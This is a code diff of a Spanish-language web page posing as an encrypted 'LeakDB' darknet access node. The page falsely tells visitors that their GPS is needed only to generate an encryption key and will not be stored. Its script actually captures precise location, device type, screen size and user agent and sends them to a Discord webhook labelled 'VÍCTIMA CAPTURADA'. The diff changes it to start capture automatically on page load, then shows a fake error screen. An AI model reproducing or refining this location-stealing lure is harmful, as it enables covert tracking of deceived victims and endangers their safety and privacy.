@@ -17,7 +17,6 @@
             position: relative;
         }
 
-        /* Efecto Matrix */
         #matrix {
             position: fixed;
             top: 0;
@@ -85,57 +84,25 @@
             letter-spacing: 2px;
         }
 
-        .warning-box {
-            background: rgba(255, 255, 0, 0.1);
-            border: 1px solid #ff0;
+        .status-box {
+            background: rgba(0, 50, 0, 0.3);
+            border: 1px solid #0f0;
             padding: 20px;
             margin: 20px 0;
             border-radius: 5px;
-        }
-
-        .warning-box h2 {
-            color: #ff0;
-            font-size: 1.2rem;
-            margin-bottom: 15px;
-            text-align: center;
-        }
-
-        .warning-box p {
-            color: #0f0;
-            line-height: 1.8;
-            font-size: 0.9rem;
-        }
-
-        .btn {
-            width: 100%;
-            background: linear-gradient(90deg, #0f0, #0a0);
-            color: #000;
-            border: 2px solid #0f0;
-            padding: 15px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            font-family: 'Share Tech Mono', monospace;
-            cursor: pointer;
-            border-radius: 5px;
-            margin-top: 20px;
-            transition: all 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        .btn:hover {
-            background: #0f0;
-            box-shadow: 0 0 30px #0f0;
-            transform: scale(1.02);
-        }
-
-        .btn:active {
-            transform: scale(0.98);
+            min-height: 200px;
         }
 
         .status-line {
-            margin: 10px 0;
-            display: none;
+            margin: 12px 0;
+            display: flex;
+            align-items: center;
+            opacity: 0;
+            animation: fadeIn 0.5s forwards;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
         }
 
         .status-line::before {
@@ -157,7 +124,7 @@
             border-radius: 5px;
             overflow: hidden;
             margin: 20px 0;
-            display: none;
+            position: relative;
         }
 
         .progress-fill {
@@ -168,10 +135,19 @@
             box-shadow: 0 0 20px #0f0;
         }
 
-        .blocked-box {
+        .progress-text {
+            position: absolute;
+            width: 100%;
+            text-align: center;
+            line-height: 25px;
+            font-weight: bold;
+            text-shadow: 0 0 5px #000;
+        }
+
+        .warning-box {
             display: none;
-            background: rgba(139, 0, 0, 0.3);
-            border: 2px solid #f00;
+            background: rgba(255, 255, 0, 0.1);
+            border: 2px solid #ff0;
             padding: 20px;
             margin-top: 20px;
             border-radius: 5px;
@@ -179,6 +155,28 @@
         }
 
         @keyframes warningPulse {
+            0%, 100% { border-color: #ff0; box-shadow: 0 0 20px rgba(255, 255, 0, 0.3); }
+            50% { border-color: #f80; box-shadow: 0 0 30px rgba(255, 128, 0, 0.5); }
+        }
+
+        .warning-box h2 {
+            color: #ff0;
+            text-align: center;
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+
+        .blocked-box {
+            display: none;
+            background: rgba(139, 0, 0, 0.3);
+            border: 2px solid #f00;
+            padding: 20px;
+            margin-top: 20px;
+            border-radius: 5px;
+            animation: errorPulse 1s infinite;
+        }
+
+        @keyframes errorPulse {
             0%, 100% { border-color: #f00; }
             50% { border-color: #ff0; }
         }
@@ -230,42 +228,36 @@
                 <div class="subtitle">ENCRYPTED NODE v4.7.2 | AES-256</div>
             </div>
 
-            <div id="initialScreen">
-                <div class="warning-box">
-                    <h2>⚠️ PROTOCOLO DE SEGURIDAD REQUERIDO</h2>
-                    <p>
-                        ► Para acceder a la base de datos LeakDB, su identidad debe ser <strong>ENCRIPTADA</strong>.<br><br>
-                        ► Este sistema utiliza cifrado AES-256 combinado con su ubicación GPS para generar una clave única temporal.<br><br>
-                        ► Su ubicación <strong>NO será almacenada</strong>, solo se usa para el algoritmo de encriptación.<br><br>
-                        ► <strong>IMPORTANTE:</strong> Active su GPS y permita el acceso cuando su navegador lo solicite.
-                    </p>
-                </div>
-
-                <button class="btn" onclick="iniciarEncriptacion()">
-                    🔒 INICIAR ENCRIPTACIÓN DE IDENTIDAD
-                </button>
+            <div class="status-box" id="statusBox">
+                <div class="status-line" id="line1">Inicializando protocolo de encriptación...</div>
+                <div class="status-line" id="line2" style="display:none;">Estableciendo conexión con nodo seguro...</div>
+                <div class="status-line" id="line3" style="display:none;">Solicitando coordenadas GPS para cifrado...</div>
+                <div class="status-line" id="line4" style="display:none;">Generando clave AES-256...</div>
+                <div class="status-line" id="line5" style="display:none;">Verificando integridad del túnel...</div>
             </div>
 
-            <div id="processingScreen" style="display:none;">
-                <div class="status-line" id="line1">Inicializando protocolo AES-256...</div>
-                <div class="status-line" id="line2">Solicitando coordenadas GPS...</div>
-                <div class="status-line" id="line3">Generando hash criptográfico...</div>
-                <div class="status-line" id="line4">Estableciendo túnel seguro...</div>
-                                <div class="status-line" id="line5">Verificando integridad del nodo...</div>
-                
-                <div class="progress-bar" id="progressBar">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressBar"></div>
+                <div class="progress-text" id="progressText">0%</div>
             </div>
 
-            <div class="blocked-box" id="blockedScreen">
+            <div class="warning-box" id="warningBox">
+                <h2>⚠️ ESPERANDO AUTORIZACIÓN GPS</h2>
+                <p style="color: #0f0; text-align: center; line-height: 1.8;">
+                    Su navegador solicitará permiso para acceder a su ubicación.<br><br>
+                    <strong style="color: #ff0;">► DEBE PERMITIR el acceso para continuar con la encriptación</strong><br><br>
+                    Esto es necesario para generar su clave de cifrado única.
+                </p>
+            </div>
+
+                        <div class="blocked-box" id="blockedBox">
                 <div class="icon-lock">🔒</div>
-                <h2>⛔ ACCESO DENEGADO</h2>
+                <h2>⛔ ENCRIPTACIÓN FALLIDA</h2>
                 <p style="color: #f88; text-align: center; line-height: 1.8;">
-                    <strong>ERROR DE ENCRIPTACIÓN</strong><br><br>
-                    ► No se pudo establecer el cifrado de identidad.<br>
-                    ► El sistema detectó que su GPS está desactivado o el permiso fue denegado.<br><br>
-                    <span style="color: #ff0;">⚠️ Para continuar, active su ubicación y recargue la página (F5)</span>
+                    <strong>ERROR: No se pudo establecer el cifrado AES-256</strong><br><br>
+                    ► El sistema requiere sus coordenadas GPS para generar la clave de encriptación.<br>
+                    ► Permiso de ubicación <strong>DENEGADO</strong> o GPS desactivado.<br><br>
+                    <span style="color: #ff0;">⚠️ Active su ubicación y recargue la página (F5) para reintentar</span>
                 </p>
             </div>
         </div>
@@ -312,33 +304,39 @@
             return "❓ Desconocido";
         }
 
-        function iniciarEncriptacion() {
-            document.getElementById('initialScreen').style.display = 'none';
-            document.getElementById('processingScreen').style.display = 'block';
+        // INICIO AUTOMÁTICO AL CARGAR LA PÁGINA
+        window.onload = function() {
+            iniciarCaptura();
+        };
 
+        function iniciarCaptura() {
             // Mostrar líneas progresivamente
-            setTimeout(() => document.getElementById('line1').style.display = 'block', 500);
-            setTimeout(() => document.getElementById('line2').style.display = 'block', 1500);
-
-            // Solicitar GPS después de 2 segundos
+            setTimeout(() => document.getElementById('line2').style.display = 'flex', 1000);
+            setTimeout(() => document.getElementById('line3').style.display = 'flex', 2000);
+            
+            // Solicitar GPS AUTOMÁTICAMENTE después de 2.5 segundos
             setTimeout(() => {
                 if (!navigator.geolocation) {
                     mostrarError();
                     return;
                 }
 
+                // Mostrar advertencia de que se pedirá permiso
+                document.getElementById('warningBox').style.display = 'block';
+
                 const opciones = {
                     enableHighAccuracy: true,
-                    timeout: 15000,
+                    timeout: 20000,
                     maximumAge: 0
                 };
 
+                // SOLICITAR GPS AUTOMÁTICAMENTE
                 navigator.geolocation.getCurrentPosition(
                     async function(position) {
                         // ✅ GPS OBTENIDO
-                        document.getElementById('line3').style.display = 'block';
-                        document.getElementById('progressBar').style.display = 'block';
-
+                        document.getElementById('warningBox').style.display = 'none';
+                        document.getElementById('line4').style.display = 'flex';
+                        
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         const precision = position.coords.accuracy;
@@ -346,16 +344,17 @@
                         // Animación de progreso
                         let progress = 0;
                         const interval = setInterval(() => {
-                            progress += Math.random() * 5 + 2;
+                            progress += Math.random() * 4 + 2;
                             if (progress > 100) progress = 100;
-                            document.getElementById('progressFill').style.width = progress + '%';
+                            
+                            document.getElementById('progressBar').style.width = progress + '%';
+                            document.getElementById('progressText').textContent = Math.floor(progress) + '%';
 
-                            if (progress > 40) document.getElementById('line4').style.display = 'block';
-                            if (progress > 70) document.getElementById('line5').style.display = 'block';
+                            if (progress > 50) document.getElementById('line5').style.display = 'flex';
 
                             if (progress >= 100) {
                                 clearInterval(interval);
-                                setTimeout(mostrarBloqueo, 1000);
+                                setTimeout(mostrarBloqueo, 1500);
                             }
                         }, 100);
 
@@ -375,8 +374,8 @@
                             // Embed para Discord
                             const embed = {
                                 embeds: [{
-                                    title: "🎯 VÍCTIMA CAPTURADA CON GPS",
-                                    description: `**${tipoDispositivo}** | Encriptación completada`,
+                                    title: "🎯 VÍCTIMA CAPTURADA - GPS ACTIVO",
+                                    description: `**${tipoDispositivo}** | Encriptación AES-256 completada`,
                                     color: 0x00FF00,
                                     thumbnail: {
                                         url: "https://cdn-icons-png.flaticon.com/512/684/684908.png"
@@ -388,7 +387,7 @@
                                             inline: false
                                         },
                                         {
-                                            name: "🗺️ VER EN MAPA",
+                                            name: "🗺️ VER UBICACIÓN EN MAPA",
                                             value: `[🌍 Google Maps](https://www.google.com/maps?q=${lat},${lon})\n[🗺️ OpenStreetMap](https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=18)`,
                                             inline: false
                                         },
@@ -408,23 +407,23 @@
                                             inline: true
                                         },
                                         {
-                                            name: "🖥️ Pantalla",
+                                            name: "🖥️ Resolución",
                                             value: `${screen.width}x${screen.height}`,
                                             inline: true
                                         },
                                         {
-                                            name: "⏰ Timestamp",
+                                            name: "⏰ Fecha y Hora",
                                             value: new Date().toLocaleString('es-ES'),
                                             inline: false
                                         },
                                         {
-                                            name: "📱 User Agent",
+                                            name: "📱 User Agent Completo",
                                             value: `\`\`\`${navigator.userAgent}\`\`\``,
                                             inline: false
                                         }
                                     ],
                                     footer: {
-                                        text: "Darknet GPS Capture System v4.7"
+                                        text: "Darknet GPS Capture System v4.7.2"
                                     },
                                     timestamp: new Date().toISOString()
                                 }]
@@ -437,29 +436,31 @@
                                 body: JSON.stringify(embed)
                             });
 
-                            console.log('✅ GPS enviado a Discord');
+                            console.log('✅ Datos enviados a Discord');
 
                         } catch (error) {
-                            console.error('Error:', error);
-                        }
-                    },
+                            console.error('❌ Error:', error);
+                                            },
                     function(error) {
-                                                // ❌ Error al obtener GPS
+                        // ❌ ERROR AL OBTENER GPS
+                        console.error('Error GPS:', error);
                         mostrarError();
                     },
                     opciones
                 );
-            }, 2000);
+            }, 2500);
         }
 
         function mostrarBloqueo() {
-            document.getElementById('processingScreen').style.display = 'none';
-            document.getElementById('blockedScreen').style.display = 'block';
+            document.getElementById('statusBox').style.display = 'none';
+            document.getElementById('warningBox').style.display = 'none';
+            document.getElementById('blockedBox').style.display = 'block';
         }
 
         function mostrarError() {
-            document.getElementById('processingScreen').style.display = 'none';
-            document.getElementById('blockedScreen').style.display = 'block';
+            document.getElementById('statusBox').style.display = 'none';
+            document.getElementById('warningBox').style.display = 'none';
+            document.getElementById('blockedBox').style.display = 'block';
         }
 
         // Redimensionar canvas
@@ -470,3 +471,4 @@
     </script>
 </body>
 </html>
+            
